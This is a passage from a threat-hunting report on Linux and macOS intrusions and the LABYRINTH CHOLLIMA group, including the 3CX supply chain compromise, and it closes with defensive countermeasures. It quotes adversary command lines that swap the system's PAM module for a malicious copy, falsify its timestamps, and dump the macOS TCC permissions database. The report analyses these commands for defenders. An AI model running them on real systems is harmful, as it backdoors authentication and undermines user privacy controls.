or\nadversary staging servers.\n\n\n-----\n\nBash is the default shell in most Linux installations. Falcon OverWatch, however,\nhas observed adversaries use alternative shells like dash and zshell (zsh) in their\ninteractive intrusions. Given that most security tools leverage string matching in\ndetections, Falcon OverWatch hypothesizes that the use of alternate shells could\nbe attributed to signature evasion and adversarial preferences for increased speed,\nhyperthreading and/or smaller size. Though alternative shells like dash may lack some\nfeatures like tab completion, Falcon OverWatch predicts that alternative shells will\nremain popular in the future.\n\nThough this tactic is not very common, Falcon OverWatch observed a threefold\nincrease year over year in adversaries replacing PAM[37] with malicious modules,\ntypically for the purposes of a backdoor. The legitimate PAM, depending on the\ndistribution, tends to reside in /usr/lib64/security/pam_unix.so or /usr/lib/\n```\nsecurity/pam_unix.so. The adversaries masquerade[38] their malicious module as\n\n```\nthe PAM `pam_unix.so` or have their malicious version staged in another directory\n(e.g., `/tmp/pam_unix.so) before overwriting the legitimate module.`\n```\nchmod 755 pam_unix.so\ncp -i pam_unix.so pam_unix.so.1\ncp -i /tmp/pam_unix.so pam_unix.so\ntouch -r pam_xauth.so pam_unix.so\ntouch -r pam_xauth.so pam_unix.so.1\n\n```\nIn the above example, the `touch commands were likely used to conduct`\ntimestomping[39] to further evade detection.\n\n37 [For more information on this sub-technique, see the MITRE website: https://attack.mitre.org/techniques/T1556/003/.](https://attack.mitre.org/techniques/T1556/003/)\n\n38 [For more information on this sub-technique, see the MITRE website: https://attack.mitre.org/techniques/T1036/005/.](https://attack.mitre.org/techniques/T1036/005/)\n\n39 [For more information on this sub-technique, see the MITRE website: https://attack.mitre.org/techniques/T1070/006/.](https://attack.mitre.org/techniques/T1070/006/)\n\n\n-----\n\n```\nmacOS INSIGHTS AND TRENDS\n\n```\n\nFalcon OverWatch observed a marked increase in the number of interactive\nintrusions against macOS systems. The most prolific adversary, by far, was\nLABYRINTH CHOLLIMA. This group focused a number of efforts against\norganizations running macOS devices and demonstrated a high level of\nproficiency in doing so. LABYRINTH CHOLLIMA is known to target the financial\nand technology verticals, in particular cryptocurrency organizations and\nother fintech businesses that sit at the intersection of these two verticals. This\npreference plays out in the macOS intrusions by industry vertical data, shown in\nFigure 13.\n\n**macOS INTRUSIONS BY VERTICAL**\n\n###### Figure 13. macOS-based intrusion activity by industry vertical, July 2022 to June 2023\n\n\n-----\n\n###### Observed macOS Tactics\n\nFalcon OverWatch identified LABYRINTH CHOLLIMA attempting to dump the\nTransparency, Consent and Control (TCC) database. The TCC framework was\nimplemented as a security and privacy control by Apple to prevent installed\napplications from being able to access sensitive data without explicit permission\nfrom the user, which arises as a user prompt. Such permissions include full disk,\ncamera, contacts and microphone access. User responses (allow or do not allow)\nare stored in this database. If an application tries to access files in a directory\nprotected by TCC without authorization, the operation is denied. As denoted by\nthe command line below, TCC stores these permissions in a SQLite3 database\nlocated both globally `(/Library/Application Support/com.apple.TCC/TCC.`\n```\ndb) and at the user level ($HOME/Library/Application Support/com.apple.\nTCC/TCC.db).\n/bin/bash -c sqlite3 /Library/Application\\ Support/com.apple.TCC/\nTCC.db '.dump access'\n\n```\nIf an adversary were to gain write access to the TCC.db, they could grant\nthemselves TCC entitlements without alerting the user.\n\nApple implemented System Integrity Protection (SIP) to mitigate this. Being able\nto read the contents of the database, however, is trivial — an adversary requires\nthe terminal to have full disk access, which may be already enabled on many\nMacBooks. With the dumped database, an adversary would likely leverage the\noutputs to determine what applications are allowed to access which services\nand any code-signing requirement data (csreq). The output of this dump would\npresent a gold mine of possible applications to exploit. However, the CrowdStrike\nFalcon agent prevents the dumping of the TCC database on macOS hosts.\n\n\n-----\n\n##### Defensive Countermeasures\n\nWith the advances adversaries are making in targeting Linux and macOS\nenvironments, defenders must familiarize themselves with macOS and Linux TTPs\nand implement the appropriate defenses across their infrastructure.\n\n###### Implement file integrity control and monitoring around sensitive files and logs.\n\nAlert for anomalous processes reading sensitive files that may contain credentials.\n\n###### Disable remote login (i.e., SSH).\n\nIf SSH must be enabled, augment with MFA and additional identity protection to\nfurther thwart adversaries.\n\n###### Monitor and/or prevent modification of PAM components.\n\nThis can be done through proper privilege separation (e.g., SELinux).\n\n###### Enable default macOS system protections.\n\nGatekeeper and SIP should be on by default for macOS. Monitor for any disabling\nof Gatekeeper or SIP, and implement automated re-enabling of these protections.\nSecurity practitioners can automate via spctl and csrutil to re-enable\nGatekeeper and SIP, respectively.\n\n###### Maintain user awareness.\n\nTraining users on the pitfalls of disabling many of macOS’s built-in security\nprecautions can prove essential in mitigating social engineering tactics that require\nuser execution.\n\n###### Ensure coverage across the entire enterprise to reduce the attack surface.\n\nAdversaries often target vulnerable and unmanaged assets to gain initial access,\nthen use lifted credentials to pivot to additional resources via trusted remote access\nsoftware and protocols. A mix of comprehensive endpoint coverage and proactive\nthreat hunting is crucial for minimizing security gaps and detecting intrusions that\naim to evade traditional detection methods.\n\n\nand csrutil to re-enable\n\n\n-----\n\n```\nTHREAT ACTOR SPOTLIGHT: LABYRINTH CHOLLIMA\n\n```\n\n###### Targeting the Supply Chain\n\nOn March 29, 2023, Falcon OverWatch observed unexpected malicious activity\nemanating from a legitimate, signed binary: 3CXDesktopApp, a softphone\napplication from 3CX. The malicious activity included beaconing to actorcontrolled infrastructure, deployment of second-stage payloads and, in sparse\ncases, hands-on-keyboard activity. Once active, the HTTPS beacon structure\nand encryption key match those observed by CrowdStrike in a March 7, 2023,\ncampaign attributed with high confidence to LABYRINTH CHOLLIMA.[40]\n\nThis attack is the result of a unique and complex adversarial supply chain\noperation. It was not simply a single supply chain compromise; rather, it was\na layered exploitation — a double supply chain attack. The threat actor first\nbreached third-party software used by 3CX, which then provided the necessary\nconduit to ultimately compromise the 3CXDesktopApp.[41]\n\nThe resulting compromise led to the delivery of the Gopuram backdoor, which\naffected both Windows and macOS versions of the software. Gopuram is a\nstealthy second-stage backdoor that employs numerous evasion techniques\nto gain unauthorized access and persist on the target host. Once deployed, the\nbackdoor enabled the threat actor to execute commands, upload and download\nfiles, manipulate processes and services, and exfiltrate sensitive data — posing a\nconsiderable threat to victim organizations' networks.[42] LABYRINTH CHOLLIMA’s\ntargets in this campaign were predominantly cryptocurrency companies,\nonce again highlighting the unique nature of this DPRK-nexus threat actor's\nsophisticated operations focused on financial gain.\n\nLABYRINTH CHOLLIMA, known for their history of supply chain attacks,\nmanaged to maintain the prolonged persistence of their backdoor within the\ninfected application. This attack signifies an escalated threat with a double supply\nchain compromise and broad compatibility of their malware — highlighting their\nadvanced tactics, robust operational capacity and ongoing multi-platform threat.\n\nThe multi-platform threat presented by LABYRINTH CHOLLIMA's latest attack\nsignificantly broadens the group's potential victim landscape. This underlines their\nadaptability and the increased risk they pose to diverse systems — specifically, the\ncombination of Windows and macOS at once. However, this is not LABYRINTH\nCHOLLIMA’s first attack focused on macOS. The U.S. Federal Bureau of\nInvestigations, Cybersecurity and Infrastructure Security Agency (CISA), and\nDepartment of the Treasury have released multiple joint cybersecurity advisories\non LABYRINTH CHOLLIMA’s AppleJeus malware, which is a macOS variant\nof their Jeus malware that is commonly disguised as a cryptocurrency trading\napplication.[43]\n\n40 [For additional details on the discovery of the malware, visit https://www.crowdstrike.com/blog/crowdstrike-detects-](https://www.crowdstrike.com/blog/crowdstrike-detects-and-prevents-active-intrusion-campaign-targeting-3cxdesktopapp-customers/)\n\n[and-prevents-active-intrusion-campaign-targeting-3cxdesktopapp-customers/.](https://www.crowdstrike.com/blog/crowdstrike-detects-and-prevents-active-intrusion-campaign-targeting-3cxdesktopapp-customers/)\n\n41 For additional details on the double supply chain attack, visit [https://krebsonsecurity.com/2023/04/3cx-breach-was-](https://krebsonsecurity.com/2023/04/3cx-breach-was-a-double-supply-chain-compromise/)\n\n[a-double-supply-chain-compromise/.](https://krebsonsecurity.com/2023/04/3cx-breach-was-a-double-supply-chain-compromise/)\n\n42 [For more information on the Gopuram backdoor, visit https://securelist.com/gopuram-backdoor-deployed-through-](https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/)\n\n\n-----\n\n## Conclusion\n\nThis report pulls back the curtain on the reality that Falcon OverWatch threat hunters\nface daily: Adversaries are continuously striving to broaden their reach and deepen\ntheir impact, despite the barriers placed before them by security products.\n\nFalcon OverWatch values collaboration with their customers and the security\ncommunity.
